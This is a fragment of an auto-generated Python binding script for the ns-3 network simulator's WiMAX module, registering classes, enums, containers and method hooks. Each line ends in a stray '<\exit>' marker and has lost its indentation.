module.add_class('WimaxHelper', parent=[root_module['ns3::PcapHelperForDevice'], root_module['ns3::AsciiTraceHelperForDevice']])<\exit>
module.add_enum('NetDeviceType', ['DEVICE_TYPE_SUBSCRIBER_STATION', 'DEVICE_TYPE_BASE_STATION'], outer_class=root_module['ns3::WimaxHelper'])<\exit>
module.add_enum('PhyType', ['SIMPLE_PHY_TYPE_OFDM'], outer_class=root_module['ns3::WimaxHelper'])<\exit>
module.add_enum('SchedulerType', ['SCHED_TYPE_SIMPLE', 'SCHED_TYPE_RTPS', 'SCHED_TYPE_MBQOS'], outer_class=root_module['ns3::WimaxHelper'])<\exit>
module.add_class('ZetaVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])<\exit>
module.add_class('ZipfVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])<\exit>
module.add_class('empty', import_from_module='ns.core')<\exit>
module.add_class('int64x64_t', import_from_module='ns.core')<\exit>
module.add_class('simpleOfdmSendParam')<\exit>
module.add_class('Chunk', import_from_module='ns.network', parent=root_module['ns3::ObjectBase'])<\exit>
module.add_class('ClassificationRuleVectorTlvValue', parent=root_module['ns3::VectorTlvValue'])<\exit>
module.add_enum('ClassificationRuleTlvType', ['Priority', 'ToS', 'Protocol', 'IP_src', 'IP_dst', 'Port_src', 'Port_dst', 'Index'], outer_class=root_module['ns3::ClassificationRuleVectorTlvValue'])<\exit>
module.add_class('ConstantVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])<\exit>
module.add_class('CsParamVectorTlvValue', parent=root_module['ns3::VectorTlvValue'])<\exit>
module.add_enum('Type', ['Classifier_DSC_Action', 'Packet_Classification_Rule'], outer_class=root_module['ns3::CsParamVectorTlvValue'])<\exit>
module.add_class('DeterministicVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])<\exit>
module.add_class('EmpiricalVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])<\exit>
module.add_class('ErlangVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])<\exit>
module.add_class('ExponentialVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])<\exit>
module.add_class('GammaVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])<\exit>
module.add_class('Header', import_from_module='ns.network', parent=root_module['ns3::Chunk'])<\exit>
module.add_class('IntEmpiricalVariable', import_from_module='ns.core', parent=root_module['ns3::EmpiricalVariable'])<\exit>
module.add_class('Ipv4AddressTlvValue', parent=root_module['ns3::TlvValue'])<\exit>
module.add_class('ipv4Addr', outer_class=root_module['ns3::Ipv4AddressTlvValue'])<\exit>
module.add_class('LogNormalVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])<\exit>
module.add_class('MacHeaderType', parent=root_module['ns3::Header'])<\exit>
module.add_enum('HeaderType', ['HEADER_TYPE_GENERIC', 'HEADER_TYPE_BANDWIDTH'], outer_class=root_module['ns3::MacHeaderType'])<\exit>
module.add_class('ManagementMessageType', parent=root_module['ns3::Header'])<\exit>
module.add_enum('MessageType', ['MESSAGE_TYPE_UCD', 'MESSAGE_TYPE_DCD', 'MESSAGE_TYPE_DL_MAP', 'MESSAGE_TYPE_UL_MAP', 'MESSAGE_TYPE_RNG_REQ', 'MESSAGE_TYPE_RNG_RSP', 'MESSAGE_TYPE_REG_REQ', 'MESSAGE_TYPE_REG_RSP', 'MESSAGE_TYPE_DSA_REQ', 'MESSAGE_TYPE_DSA_RSP', 'MESSAGE_TYPE_DSA_ACK'], outer_class=root_module['ns3::ManagementMessageType'])<\exit>
module.add_class('NormalVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])<\exit>
module.add_class('Object', import_from_module='ns.core', parent=root_module['ns3::SimpleRefCount< ns3::Object, ns3::ObjectBase, ns3::ObjectDeleter >'])<\exit>
module.add_class('AggregateIterator', import_from_module='ns.core', outer_class=root_module['ns3::Object'])<\exit>
module.add_class('OfdmDownlinkFramePrefix', parent=root_module['ns3::Header'])<\exit>
module.add_class('OfdmSendParams', parent=root_module['ns3::SendParams'])<\exit>
module.add_class('OfdmUcdChannelEncodings', parent=root_module['ns3::UcdChannelEncodings'])<\exit>
module.add_class('PacketBurst', import_from_module='ns.network', parent=root_module['ns3::Object'])<\exit>
module.add_class('ParetoVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])<\exit>
module.add_class('PcapFileWrapper', import_from_module='ns.network', parent=root_module['ns3::Object'])<\exit>
module.add_class('PortRangeTlvValue', parent=root_module['ns3::TlvValue'])<\exit>
module.add_class('PortRange', outer_class=root_module['ns3::PortRangeTlvValue'])<\exit>
module.add_class('PriorityUlJob', parent=root_module['ns3::Object'])<\exit>
module.add_class('PropagationLossModel', import_from_module='ns.propagation', parent=root_module['ns3::Object'])<\exit>
module.add_class('ProtocolTlvValue', parent=root_module['ns3::TlvValue'])<\exit>
module.add_class('RandomPropagationLossModel', import_from_module='ns.propagation', parent=root_module['ns3::PropagationLossModel'])<\exit>
module.add_class('RangePropagationLossModel', import_from_module='ns.propagation', parent=root_module['ns3::PropagationLossModel'])<\exit>
module.add_class('RngReq', parent=root_module['ns3::Header'])<\exit>
module.add_class('RngRsp', parent=root_module['ns3::Header'])<\exit>
module.add_class('SSManager', parent=root_module['ns3::Object'])<\exit>
module.add_class('ServiceFlowManager', parent=root_module['ns3::Object'])<\exit>
module.add_enum('ConfirmationCode', ['CONFIRMATION_CODE_SUCCESS', 'CONFIRMATION_CODE_REJECT'], outer_class=root_module['ns3::ServiceFlowManager'])<\exit>
module.add_class('SfVectorTlvValue', parent=root_module['ns3::VectorTlvValue'])<\exit>
module.add_enum('Type', ['SFID', 'CID', 'Service_Class_Name', 'reserved1', 'QoS_Parameter_Set_Type', 'Traffic_Priority', 'Maximum_Sustained_Traffic_Rate', 'Maximum_Traffic_Burst', 'Minimum_Reserved_Traffic_Rate', 'Minimum_Tolerable_Traffic_Rate', 'Service_Flow_Scheduling_Type', 'Request_Transmission_Policy', 'Tolerated_Jitter', 'Maximum_Latency', 'Fixed_length_versus_Variable_length_SDU_Indicator', 'SDU_Size', 'Target_SAID', 'ARQ_Enable', 'ARQ_WINDOW_SIZE', 'ARQ_RETRY_TIMEOUT_Transmitter_Delay', 'ARQ_RETRY_TIMEOUT_Receiver_Delay', 'ARQ_BLOCK_LIFETIME', 'ARQ_SYNC_LOSS', 'ARQ_DELIVER_IN_ORDER', 'ARQ_PURGE_TIMEOUT', 'ARQ_BLOCK_SIZE', 'reserved2', 'CS_Specification', 'IPV4_CS_Parameters'], outer_class=root_module['ns3::SfVectorTlvValue'])<\exit>
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::AttributeAccessor', 'ns3::empty', 'ns3::DefaultDeleter<ns3::AttributeAccessor>'], parent=root_module['ns3::empty'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))<\exit>
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::AttributeChecker', 'ns3::empty', 'ns3::DefaultDeleter<ns3::AttributeChecker>'], parent=root_module['ns3::empty'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))<\exit>
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::AttributeValue', 'ns3::empty', 'ns3::DefaultDeleter<ns3::AttributeValue>'], parent=root_module['ns3::empty'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))<\exit>
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::CallbackImplBase', 'ns3::empty', 'ns3::DefaultDeleter<ns3::CallbackImplBase>'], parent=root_module['ns3::empty'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))<\exit>
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::EventImpl', 'ns3::empty', 'ns3::DefaultDeleter<ns3::EventImpl>'], parent=root_module['ns3::empty'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))<\exit>
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::NixVector', 'ns3::empty', 'ns3::DefaultDeleter<ns3::NixVector>'], parent=root_module['ns3::empty'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))<\exit>
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::OutputStreamWrapper', 'ns3::empty', 'ns3::DefaultDeleter<ns3::OutputStreamWrapper>'], parent=root_module['ns3::empty'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))<\exit>
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::Packet', 'ns3::empty', 'ns3::DefaultDeleter<ns3::Packet>'], parent=root_module['ns3::empty'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))<\exit>
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::TraceSourceAccessor', 'ns3::empty', 'ns3::DefaultDeleter<ns3::TraceSourceAccessor>'], parent=root_module['ns3::empty'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))<\exit>
module.add_class('SsServiceFlowManager', parent=root_module['ns3::ServiceFlowManager'])<\exit>
module.add_enum('ConfirmationCode', ['CONFIRMATION_CODE_SUCCESS', 'CONFIRMATION_CODE_REJECT'], outer_class=root_module['ns3::SsServiceFlowManager'])<\exit>
module.add_class('ThreeLogDistancePropagationLossModel', import_from_module='ns.propagation', parent=root_module['ns3::PropagationLossModel'])<\exit>
module.add_class('Time', import_from_module='ns.core')<\exit>
module.add_enum('Unit', ['S', 'MS', 'US', 'NS', 'PS', 'FS', 'LAST'], outer_class=root_module['ns3::Time'], import_from_module='ns.core')<\exit>
root_module['ns3::Time'].implicitly_converts_to(root_module['ns3::int64x64_t'])<\exit>
module.add_class('Tlv', parent=root_module['ns3::Header'])<\exit>
module.add_enum('CommonTypes', ['HMAC_TUPLE', 'MAC_VERSION_ENCODING', 'CURRENT_TRANSMIT_POWER', 'DOWNLINK_SERVICE_FLOW', 'UPLINK_SERVICE_FLOW', 'VENDOR_ID_EMCODING', 'VENDOR_SPECIFIC_INFORMATION'], outer_class=root_module['ns3::Tlv'])<\exit>
module.add_class('TraceSourceAccessor', import_from_module='ns.core', parent=root_module['ns3::SimpleRefCount< ns3::TraceSourceAccessor, ns3::empty, ns3::DefaultDeleter<ns3::TraceSourceAccessor> >'])<\exit>
module.add_class('Trailer', import_from_module='ns.network', parent=root_module['ns3::Chunk'])<\exit>
module.add_class('TwoRayGroundPropagationLossModel', import_from_module='ns.propagation', parent=root_module['ns3::PropagationLossModel'])<\exit>
module.add_class('Ucd', parent=root_module['ns3::Header'])<\exit>
module.add_class('UlJob', parent=root_module['ns3::Object'])<\exit>
module.add_enum('JobPriority', ['LOW', 'INTERMEDIATE', 'HIGH'], outer_class=root_module['ns3::UlJob'])<\exit>
module.add_class('UlMap', parent=root_module['ns3::Header'])<\exit>
module.add_class('UplinkScheduler', parent=root_module['ns3::Object'])<\exit>
module.add_class('UplinkSchedulerMBQoS', parent=root_module['ns3::UplinkScheduler'])<\exit>
module.add_class('UplinkSchedulerRtps', parent=root_module['ns3::UplinkScheduler'])<\exit>
module.add_class('UplinkSchedulerSimple', parent=root_module['ns3::UplinkScheduler'])<\exit>
module.add_class('WimaxConnection', parent=root_module['ns3::Object'])<\exit>
module.add_class('WimaxMacQueue', parent=root_module['ns3::Object'])<\exit>
module.add_class('WimaxMacToMacHeader', parent=root_module['ns3::Header'])<\exit>
module.add_class('WimaxPhy', parent=root_module['ns3::Object'])<\exit>
module.add_enum('ModulationType', ['MODULATION_TYPE_BPSK_12', 'MODULATION_TYPE_QPSK_12', 'MODULATION_TYPE_QPSK_34', 'MODULATION_TYPE_QAM16_12', 'MODULATION_TYPE_QAM16_34', 'MODULATION_TYPE_QAM64_23', 'MODULATION_TYPE_QAM64_34'], outer_class=root_module['ns3::WimaxPhy'])<\exit>
module.add_enum('PhyState', ['PHY_STATE_IDLE', 'PHY_STATE_SCANNING', 'PHY_STATE_TX', 'PHY_STATE_RX'], outer_class=root_module['ns3::WimaxPhy'])<\exit>
module.add_enum('PhyType', ['SimpleWimaxPhy', 'simpleOfdmWimaxPhy'], outer_class=root_module['ns3::WimaxPhy'])<\exit>
module.add_class('AttributeAccessor', import_from_module='ns.core', parent=root_module['ns3::SimpleRefCount< ns3::AttributeAccessor, ns3::empty, ns3::DefaultDeleter<ns3::AttributeAccessor> >'])<\exit>
module.add_class('AttributeChecker', allow_subclassing=False, automatic_type_narrowing=True, import_from_module='ns.core', parent=root_module['ns3::SimpleRefCount< ns3::AttributeChecker, ns3::empty, ns3::DefaultDeleter<ns3::AttributeChecker> >'])<\exit>
module.add_class('AttributeValue', allow_subclassing=False, automatic_type_narrowing=True, import_from_module='ns.core', parent=root_module['ns3::SimpleRefCount< ns3::AttributeValue, ns3::empty, ns3::DefaultDeleter<ns3::AttributeValue> >'])<\exit>
module.add_class('BSScheduler', parent=root_module['ns3::Object'])<\exit>
module.add_class('BSSchedulerRtps', parent=root_module['ns3::BSScheduler'])<\exit>
module.add_class('BSSchedulerSimple', parent=root_module['ns3::BSScheduler'])<\exit>
module.add_class('BandwidthRequestHeader', parent=root_module['ns3::Header'])<\exit>
module.add_enum('HeaderType', ['HEADER_TYPE_INCREMENTAL', 'HEADER_TYPE_AGGREGATE'], outer_class=root_module['ns3::BandwidthRequestHeader'])<\exit>
module.add_class('BsServiceFlowManager', parent=root_module['ns3::ServiceFlowManager'])<\exit>
module.add_enum('ConfirmationCode', ['CONFIRMATION_CODE_SUCCESS', 'CONFIRMATION_CODE_REJECT'], outer_class=root_module['ns3::BsServiceFlowManager'])<\exit>
module.add_class('CallbackChecker', import_from_module='ns.core', parent=root_module['ns3::AttributeChecker'])<\exit>
module.add_class('CallbackImplBase', import_from_module='ns.core', parent=root_module['ns3::SimpleRefCount< ns3::CallbackImplBase, ns3::empty, ns3::DefaultDeleter<ns3::CallbackImplBase> >'])<\exit>
module.add_class('CallbackValue', import_from_module='ns.core', parent=root_module['ns3::AttributeValue'])<\exit>
module.add_class('Channel', import_from_module='ns.network', parent=root_module['ns3::Object'])<\exit>
module.add_class('ConnectionManager', parent=root_module['ns3::Object'])<\exit>
module.add_class('Dcd', parent=root_module['ns3::Header'])<\exit>
module.add_class('DlMap', parent=root_module['ns3::Header'])<\exit>
module.add_class('DsaAck', parent=root_module['ns3::Header'])<\exit>
module.add_class('DsaReq', parent=root_module['ns3::Header'])<\exit>
module.add_class('DsaRsp', parent=root_module['ns3::Header'])<\exit>
module.add_class('EmptyAttributeValue', import_from_module='ns.core', parent=root_module['ns3::AttributeValue'])<\exit>
module.add_class('EventImpl', import_from_module='ns.core', parent=root_module['ns3::SimpleRefCount< ns3::EventImpl, ns3::empty, ns3::DefaultDeleter<ns3::EventImpl> >'])<\exit>
module.add_class('FixedRssLossModel', import_from_module='ns.propagation', parent=root_module['ns3::PropagationLossModel'])<\exit>
module.add_class('FragmentationSubheader', parent=root_module['ns3::Header'])<\exit>
module.add_class('FriisPropagationLossModel', import_from_module='ns.propagation', parent=root_module['ns3::PropagationLossModel'])<\exit>
module.add_class('GenericMacHeader', parent=root_module['ns3::Header'])<\exit>
module.add_class('GrantManagementSubheader', parent=root_module['ns3::Header'])<\exit>
module.add_class('IpcsClassifier', parent=root_module['ns3::Object'])<\exit>
module.add_class('Ipv4AddressChecker', import_from_module='ns.network', parent=root_module['ns3::AttributeChecker'])<\exit>
module.add_class('Ipv4AddressValue', import_from_module='ns.network', parent=root_module['ns3::AttributeValue'])<\exit>
module.add_class('Ipv4MaskChecker', import_from_module='ns.network', parent=root_module['ns3::AttributeChecker'])<\exit>
module.add_class('Ipv4MaskValue', import_from_module='ns.network', parent=root_module['ns3::AttributeValue'])<\exit>
module.add_class('Ipv6AddressChecker', import_from_module='ns.network', parent=root_module['ns3::AttributeChecker'])<\exit>
module.add_class('Ipv6AddressValue', import_from_module='ns.network', parent=root_module['ns3::AttributeValue'])<\exit>
module.add_class('Ipv6PrefixChecker', import_from_module='ns.network', parent=root_module['ns3::AttributeChecker'])<\exit>
module.add_class('Ipv6PrefixValue', import_from_module='ns.network', parent=root_module['ns3::AttributeValue'])<\exit>
module.add_class('LogDistancePropagationLossModel', import_from_module='ns.propagation', parent=root_module['ns3::PropagationLossModel'])<\exit>
module.add_class('Mac48AddressChecker', import_from_module='ns.network', parent=root_module['ns3::AttributeChecker'])<\exit>
module.add_class('Mac48AddressValue', import_from_module='ns.network', parent=root_module['ns3::AttributeValue'])<\exit>
module.add_class('MatrixPropagationLossModel', import_from_module='ns.propagation', parent=root_module['ns3::PropagationLossModel'])<\exit>
module.add_class('NakagamiPropagationLossModel', import_from_module='ns.propagation', parent=root_module['ns3::PropagationLossModel'])<\exit>
module.add_class('NetDevice', import_from_module='ns.network', parent=root_module['ns3::Object'])<\exit>
module.add_enum('PacketType', ['PACKET_HOST', 'NS3_PACKET_HOST', 'PACKET_BROADCAST', 'NS3_PACKET_BROADCAST', 'PACKET_MULTICAST', 'NS3_PACKET_MULTICAST', 'PACKET_OTHERHOST', 'NS3_PACKET_OTHERHOST'], outer_class=root_module['ns3::NetDevice'], import_from_module='ns.network')<\exit>
module.add_class('NixVector', import_from_module='ns.network', parent=root_module['ns3::SimpleRefCount< ns3::NixVector, ns3::empty, ns3::DefaultDeleter<ns3::NixVector> >'])<\exit>
module.add_class('Node', import_from_module='ns.network', parent=root_module['ns3::Object'])<\exit>
module.add_class('ObjectFactoryChecker', import_from_module='ns.core', parent=root_module['ns3::AttributeChecker'])<\exit>
module.add_class('ObjectFactoryValue', import_from_module='ns.core', parent=root_module['ns3::AttributeValue'])<\exit>
module.add_class('OutputStreamWrapper', import_from_module='ns.network', parent=root_module['ns3::SimpleRefCount< ns3::OutputStreamWrapper, ns3::empty, ns3::DefaultDeleter<ns3::OutputStreamWrapper> >'])<\exit>
module.add_class('Packet', import_from_module='ns.network', parent=root_module['ns3::SimpleRefCount< ns3::Packet, ns3::empty, ns3::DefaultDeleter<ns3::Packet> >'])<\exit>
module.add_class('RandomVariableChecker', import_from_module='ns.core', parent=root_module['ns3::AttributeChecker'])<\exit>
module.add_class('RandomVariableValue', import_from_module='ns.core', parent=root_module['ns3::AttributeValue'])<\exit>
module.add_class('SimpleOfdmWimaxPhy', parent=root_module['ns3::WimaxPhy'])<\exit>
module.add_enum('FrameDurationCode', ['FRAME_DURATION_2_POINT_5_MS', 'FRAME_DURATION_4_MS', 'FRAME_DURATION_5_MS', 'FRAME_DURATION_8_MS', 'FRAME_DURATION_10_MS', 'FRAME_DURATION_12_POINT_5_MS', 'FRAME_DURATION_20_MS'], outer_class=root_module['ns3::SimpleOfdmWimaxPhy'])<\exit>
module.add_class('TimeChecker', import_from_module='ns.core', parent=root_module['ns3::AttributeChecker'])<\exit>
module.add_class('TimeValue', import_from_module='ns.core', parent=root_module['ns3::AttributeValue'])<\exit>
module.add_class('TypeIdChecker', import_from_module='ns.core', parent=root_module['ns3::AttributeChecker'])<\exit>
module.add_class('TypeIdValue', import_from_module='ns.core', parent=root_module['ns3::AttributeValue'])<\exit>
module.add_class('UintegerValue', import_from_module='ns.core', parent=root_module['ns3::AttributeValue'])<\exit>
module.add_class('WimaxChannel', parent=root_module['ns3::Channel'])<\exit>
module.add_class('WimaxNetDevice', parent=root_module['ns3::NetDevice'])<\exit>
module.add_enum('Direction', ['DIRECTION_DOWNLINK', 'DIRECTION_UPLINK'], outer_class=root_module['ns3::WimaxNetDevice'])<\exit>
module.add_enum('RangingStatus', ['RANGING_STATUS_EXPIRED', 'RANGING_STATUS_CONTINUE', 'RANGING_STATUS_ABORT', 'RANGING_STATUS_SUCCESS'], outer_class=root_module['ns3::WimaxNetDevice'])<\exit>
module.add_class('AddressChecker', import_from_module='ns.network', parent=root_module['ns3::AttributeChecker'])<\exit>
module.add_class('AddressValue', import_from_module='ns.network', parent=root_module['ns3::AttributeValue'])<\exit>
module.add_class('BaseStationNetDevice', parent=root_module['ns3::WimaxNetDevice'])<\exit>
module.add_enum('State', ['BS_STATE_DL_SUB_FRAME', 'BS_STATE_UL_SUB_FRAME', 'BS_STATE_TTG', 'BS_STATE_RTG'], outer_class=root_module['ns3::BaseStationNetDevice'])<\exit>
module.add_enum('MacPreamble', ['SHORT_PREAMBLE', 'LONG_PREAMBLE'], outer_class=root_module['ns3::BaseStationNetDevice'])<\exit>
module.add_class('SimpleOfdmWimaxChannel', parent=root_module['ns3::WimaxChannel'])<\exit>
module.add_enum('PropModel', ['RANDOM_PROPAGATION', 'FRIIS_PROPAGATION', 'LOG_DISTANCE_PROPAGATION', 'COST231_PROPAGATION'], outer_class=root_module['ns3::SimpleOfdmWimaxChannel'])<\exit>
module.add_class('SubscriberStationNetDevice', parent=root_module['ns3::WimaxNetDevice'])<\exit>
module.add_enum('State', ['SS_STATE_IDLE', 'SS_STATE_SCANNING', 'SS_STATE_SYNCHRONIZING', 'SS_STATE_ACQUIRING_PARAMETERS', 'SS_STATE_WAITING_REG_RANG_INTRVL', 'SS_STATE_WAITING_INV_RANG_INTRVL', 'SS_STATE_WAITING_RNG_RSP', 'SS_STATE_ADJUSTING_PARAMETERS', 'SS_STATE_REGISTERED', 'SS_STATE_TRANSMITTING', 'SS_STATE_STOPPED'], outer_class=root_module['ns3::SubscriberStationNetDevice'])<\exit>
module.add_enum('EventType', ['EVENT_NONE', 'EVENT_WAIT_FOR_RNG_RSP', 'EVENT_DL_MAP_SYNC_TIMEOUT', 'EVENT_LOST_DL_MAP', 'EVENT_LOST_UL_MAP', 'EVENT_DCD_WAIT_TIMEOUT', 'EVENT_UCD_WAIT_TIMEOUT', 'EVENT_RANG_OPP_WAIT_TIMEOUT'], outer_class=root_module['ns3::SubscriberStationNetDevice'])<\exit>
module.add_container('std::vector< ns3::ServiceFlow * >', 'ns3::ServiceFlow *', container_type='vector')<\exit>
module.add_container('std::vector< bool >', 'bool', container_type='vector')<\exit>
module.add_container('ns3::bvec', 'bool', container_type='vector')<\exit>
module.add_container('std::vector< ns3::DlFramePrefixIe >', 'ns3::DlFramePrefixIe', container_type='vector')<\exit>
module.add_container('std::list< ns3::Ptr< ns3::Packet > >', 'ns3::Ptr< ns3::Packet >', container_type='list')<\exit>
module.add_container('std::vector< ns3::SSRecord * >', 'ns3::SSRecord *', container_type='vector')<\exit>
module.add_container('std::vector< ns3::OfdmUlBurstProfile >', 'ns3::OfdmUlBurstProfile', container_type='vector')<\exit>
module.add_container('std::list< ns3::OfdmUlMapIe >', 'ns3::OfdmUlMapIe', container_type='list')<\exit>
module.add_container('std::list< ns3::Ptr< ns3::UlJob > >', 'ns3::Ptr< ns3::UlJob >', container_type='list')<\exit>
module.add_container('std::list< ns3::Ptr< ns3::Packet const > >', 'ns3::Ptr< ns3::Packet const >', container_type='list')<\exit>
module.add_container('std::deque< ns3::WimaxMacQueue::QueueElement >', 'ns3::WimaxMacQueue::QueueElement', container_type='dequeue')<\exit>
module.add_container('std::list< std::pair< ns3::OfdmDlMapIe *, ns3::Ptr< ns3::PacketBurst > > >', 'std::pair< ns3::OfdmDlMapIe *, ns3::Ptr< ns3::PacketBurst > >', container_type='list')<\exit>
module.add_container('std::vector< ns3::Ptr< ns3::WimaxConnection > >', 'ns3::Ptr< ns3::WimaxConnection >', container_type='vector')<\exit>
module.add_container('std::vector< ns3::OfdmDlBurstProfile >', 'ns3::OfdmDlBurstProfile', container_type='vector')<\exit>
module.add_container('std::list< ns3::OfdmDlMapIe >', 'ns3::OfdmDlMapIe', container_type='list')<\exit>
typehandlers.add_type_alias('void ( * ) ( std::ostream & ) *', 'ns3::LogNodePrinter')<\exit>
typehandlers.add_type_alias('void ( * ) ( std::ostream & ) **', 'ns3::LogNodePrinter*')<\exit>
typehandlers.add_type_alias('void ( * ) ( std::ostream & ) *&', 'ns3::LogNodePrinter&')<\exit>
typehandlers.add_type_alias('void ( * ) ( std::ostream & ) *', 'ns3::LogTimePrinter')<\exit>
typehandlers.add_type_alias('void ( * ) ( std::ostream & ) **', 'ns3::LogTimePrinter*')<\exit>
typehandlers.add_type_alias('void ( * ) ( std::ostream & ) *&', 'ns3::LogTimePrinter&')<\exit>
typehandlers.add_type_alias('std::vector< bool, std::allocator< bool > >', 'ns3::bvec')<\exit>
typehandlers.add_type_alias('std::vector< bool, std::allocator< bool > >*', 'ns3::bvec*')<\exit>
typehandlers.add_type_alias('std::vector< bool, std::allocator< bool > >&', 'ns3::bvec&')<\exit>
nested_module = module.add_cpp_namespace('FatalImpl')<\exit>
register_types_ns3_FatalImpl(nested_module)<\exit>
nested_module = module.add_cpp_namespace('internal')<\exit>
register_types_ns3_internal(nested_module)<\exit>
def register_types_ns3_FatalImpl(module):<\exit>
root_module = module.get_root()<\exit>
def register_types_ns3_internal(module):<\exit>
root_module = module.get_root()<\exit>
def register_methods(root_module):<\exit>
register_Ns3Address_methods(root_module, root_module['ns3::Address'])<\exit>
register_Ns3AsciiTraceHelper_methods(root_module, root_module['ns3::AsciiTraceHelper'])<\exit>
register_Ns3AsciiTraceHelperForDevice_methods(root_module, root_module['ns3::AsciiTraceHelperForDevice'])<\exit>
register_Ns3AttributeConstructionList_methods(root_module, root_module['ns3::AttributeConstructionList'])<\exit>
register_Ns3AttributeConstructionListItem_methods(root_module, root_module['ns3::AttributeConstructionList::Item'])<\exit>
register_Ns3Buffer_methods(root_module, root_module['ns3::Buffer'])<\exit>
register_Ns3BufferIterator_methods(root_module, root_module['ns3::Buffer::Iterator'])<\exit>
register_Ns3ByteTagIterator_methods(root_module, root_module['ns3::ByteTagIterator'])<\exit>
register_Ns3ByteTagIteratorItem_methods(root_module, root_module['ns3::ByteTagIterator::Item'])<\exit>
register_Ns3ByteTagList_methods(root_module, root_module['ns3::ByteTagList'])<\exit>
register_Ns3ByteTagListIterator_methods(root_module, root_module['ns3::ByteTagList::Iterator'])<\exit>
register_Ns3ByteTagListIteratorItem_methods(root_module, root_module['ns3::ByteTagList::Iterator::Item'])<\exit>
register_Ns3CallbackBase_methods(root_module, root_module['ns3::CallbackBase'])<\exit>
register_Ns3Cid_methods(root_module, root_module['ns3::Cid'])<\exit>
register_Ns3CidFactory_methods(root_module, root_module['ns3::CidFactory'])<\exit>
register_Ns3CsParameters_methods(root_module, root_module['ns3::CsParameters'])<\exit>
register_Ns3DcdChannelEncodings_methods(root_module, root_module['ns3::DcdChannelEncodings'])<\exit>
register_Ns3DlFramePrefixIe_methods(root_module, root_module['ns3::DlFramePrefixIe'])<\exit>
register_Ns3EventId_methods(root_module, root_module['ns3::EventId'])<\exit>
register_Ns3IpcsClassifierRecord_methods(root_module, root_module['ns3::IpcsClassifierRecord'])<\exit>
register_Ns3Ipv4Address_methods(root_module, root_module['ns3::Ipv4Address'])<\exit>
register_Ns3Ipv4Mask_methods(root_module, root_module['ns3::Ipv4Mask'])<\exit>
register_Ns3Ipv6Address_methods(root_module, root_module['ns3::Ipv6Address'])<\exit>
register_Ns3Ipv6Prefix_methods(root_module, root_module['ns3::Ipv6Prefix'])<\exit>
register_Ns3LogComponent_methods(root_module, root_module['ns3::LogComponent'])<\exit>
register_Ns3Mac48Address_methods(root_module, root_module['ns3::Mac48Address'])<\exit>
register_Ns3NetDeviceContainer_methods(root_module, root_module['ns3::NetDeviceContainer'])<\exit>
register_Ns3NodeContainer_methods(root_module, root_module['ns3::NodeContainer'])<\exit>
register_Ns3ObjectBase_methods(root_module, root_module['ns3::ObjectBase'])<\exit>
register_Ns3ObjectDeleter_methods(root_module, root_module['ns3::ObjectDeleter'])<\exit>
register_Ns3ObjectFactory_methods(root_module, root_module['ns3::ObjectFactory'])<\exit>
register_Ns3OfdmDcdChannelEncodings_methods(root_module, root_module['ns3::OfdmDcdChannelEncodings'])<\exit>
register_Ns3OfdmDlBurstProfile_methods(root_module, root_module['ns3::OfdmDlBurstProfile'])<\exit>
register_Ns3OfdmDlMapIe_methods(root_module, root_module['ns3::OfdmDlMapIe'])<\exit>
register_Ns3OfdmUlBurstProfile_methods(root_module, root_module['ns3::OfdmUlBurstProfile'])<\exit>
register_Ns3OfdmUlMapIe_methods(root_module, root_module['ns3::OfdmUlMapIe'])<\exit>
register_Ns3PacketMetadata_methods(root_module, root_module['ns3::PacketMetadata'])<\exit>
register_Ns3PacketMetadataItem_methods(root_module, root_module['ns3::PacketMetadata::Item'])<\exit>
register_Ns3PacketMetadataItemIterator_methods(root_module, root_module['ns3::PacketMetadata::ItemIterator'])<\exit>
register_Ns3PacketTagIterator_methods(root_module, root_module['ns3::PacketTagIterator'])<\exit>
register_Ns3PacketTagIteratorItem_methods(root_module, root_module['ns3::PacketTagIterator::Item'])<\exit>
register_Ns3PacketTagList_methods(root_module, root_module['ns3::PacketTagList'])<\exit>
register_Ns3PacketTagListTagData_methods(root_module, root_module['ns3::PacketTagList::TagData'])<\exit>
register_Ns3PcapFile_methods(root_module, root_module['ns3::PcapFile'])<\exit>
